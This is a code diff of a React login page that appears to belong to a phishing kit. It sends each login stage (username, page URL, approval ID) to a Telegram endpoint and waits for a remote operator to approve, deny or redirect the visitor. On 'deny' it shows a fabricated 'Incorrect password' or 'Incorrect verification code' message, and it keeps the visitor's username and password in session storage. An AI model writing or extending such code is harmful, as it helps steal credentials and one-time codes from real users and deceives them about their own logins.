@@ -8,9 +8,10 @@ import { Input } from "@/components/ui/input"
 import { Checkbox } from "@/components/ui/checkbox"
 import { Card, CardContent } from "@/components/ui/card"
 import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
-import { User, UserPlus, Eye, EyeOff, AlertCircle, CheckCircle, Clock } from "lucide-react"
+import { User, UserPlus, Eye, EyeOff } from "lucide-react"
 import { Spinner } from "@/components/ui/spinner"
 import {
+  APPROVAL_TIMEOUT_MS,
   LOGIN_DENIED_ERROR_TEXT,
   MSG_UNABLE_REACH_VERIFICATION,
   MSG_UNABLE_VERIFY_TIME,
@@ -35,6 +36,7 @@ const generateApprovalId = () => {
 }
 
 export default function LoginPage() {
+  const approvalTimeoutSeconds = Math.ceil(APPROVAL_TIMEOUT_MS / 1000)
   const [username, setUsername] = useState("")
   const [password, setPassword] = useState("")
   const [rememberMe, setRememberMe] = useState(false)
@@ -52,10 +54,8 @@ export default function LoginPage() {
 
   const [approvalId, setApprovalId] = useState("")
   const [awaitingApproval, setAwaitingApproval] = useState(false)
-  const [approvalCountdown, setApprovalCountdown] = useState(90)
-  const [approvalMessage, setApprovalMessage] = useState("")
+  const [approvalCountdown, setApprovalCountdown] = useState(approvalTimeoutSeconds)
   const [approvalStage, setApprovalStage] = useState<"password" | "otp" | null>(null)
-  const [approvalAction, setApprovalAction] = useState<"approve" | "deny" | "redirect" | null>(null)
 
   const [loading, setLoading] = useState({
     next: false,
@@ -75,6 +75,11 @@ export default function LoginPage() {
   }, [awaitingApproval, approvalCountdown])
 
   useEffect(() => {
+    if (!awaitingApproval || approvalCountdown > 0) return
+    handleApprovalComplete("redirect")
+  }, [approvalCountdown, awaitingApproval])
+
+  useEffect(() => {
     if (!awaitingApproval || !approvalId) return
 
     const pollInterval = window.setInterval(async () => {
@@ -83,27 +88,12 @@ export default function LoginPage() {
         const result = await response.json()
 
         if (result.success && result.data.action) {
-          setApprovalAction(result.data.action)
-          setApprovalMessage(result.data.message || "")
-
           if (result.data.action === "approve") {
-            setApprovalMessage("")
-            await wait(1500)
             handleApprovalComplete("approve")
           } else if (result.data.action === "deny") {
-            setApprovalMessage("")
-            setAwaitingApproval(false)
-            // Show page-specific error based on current stage
-            if (approvalStage === "password") {
-              setLoginError("Incorrect password. Please try again.")
-              setLoginStep("password")
-            } else if (approvalStage === "otp") {
-              setOtpError("Incorrect verification code. Please try again.")
-            }
+            handleApprovalComplete("deny")
           } else if (result.data.action === "redirect") {
-            setApprovalMessage("")
-            await wait(1500)
-            window.location.href = "/api/login-out"
+            handleApprovalComplete("redirect")
           }
         }
       } catch (error) {
@@ -145,9 +135,7 @@ export default function LoginPage() {
   const handleApprovalComplete = (action: string) => {
     setAwaitingApproval(false)
     setApprovalId("")
-    setApprovalCountdown(90)
-    setApprovalAction(null)
-    setApprovalMessage("")
+    setApprovalCountdown(approvalTimeoutSeconds)
 
     if (action === "approve") {
       if (approvalStage === "password") {
@@ -155,6 +143,23 @@ export default function LoginPage() {
       } else if (approvalStage === "otp") {
         window.location.href = "/api/login-out"
       }
+      return
+    }
+
+    if (action === "deny") {
+      if (approvalStage === "password") {
+        setPassword("")
+        setLoginStep("password")
+        setLoginError("Incorrect password. Please try again.")
+      } else if (approvalStage === "otp") {
+        setVerificationCode("")
+        setOtpError("Incorrect verification code. Please try again.")
+      }
+      return
+    }
+
+    if (action === "redirect") {
+      window.location.href = "/api/login-out"
     }
   }
 
@@ -162,30 +167,50 @@ export default function LoginPage() {
     try {
       setApprovalStage(stage)
       setAwaitingApproval(true)
-      setApprovalCountdown(90)
-      setApprovalAction(null)
-      setApprovalMessage("")
+      setApprovalCountdown(approvalTimeoutSeconds)
 
       const newApprovalId = generateApprovalId()
-      setApprovalId(newApprovalId)
+      const registerResponse = await fetch("/api/approval", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          approvalId: newApprovalId,
+          username,
+          stage,
+        }),
+      })
 
-      void fetch("/api/telegram", {
+      if (!registerResponse.ok) {
+        throw new Error("Failed to register approval")
+      }
+
+      const telegramResponse = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           type: stage === "password" ? "password_approval" : "otp_approval",
           data: {
-            username: username,
+            username,
             approvalId: newApprovalId,
-            stage: stage,
+            stage,
             pageUrl: window.location.href,
           },
         }),
-      }).catch(() => {})
+      })
+
+      if (!telegramResponse.ok) {
+        throw new Error("Failed to send approval prompt")
+      }
+
+      setApprovalId(newApprovalId)
     } catch (error) {
       console.error("Approval initiation error:", error)
       setAwaitingApproval(false)
-      setLoginError("Failed to initiate approval process")
+      if (stage === "password") {
+        setLoginError(MSG_UNABLE_REACH_VERIFICATION)
+      } else {
+        setOtpError(MSG_UNABLE_REACH_VERIFICATION)
+      }
     }
   }
 
@@ -234,8 +259,7 @@ export default function LoginPage() {
     setResendCooldown(0)
     setAwaitingApproval(false)
     setApprovalId("")
-    setApprovalAction(null)
-    setApprovalMessage("")
+    setApprovalCountdown(approvalTimeoutSeconds)
     if (typeof window !== "undefined") {
       sessionStorage.removeItem("wex_username")
       sessionStorage.removeItem("wex_password")
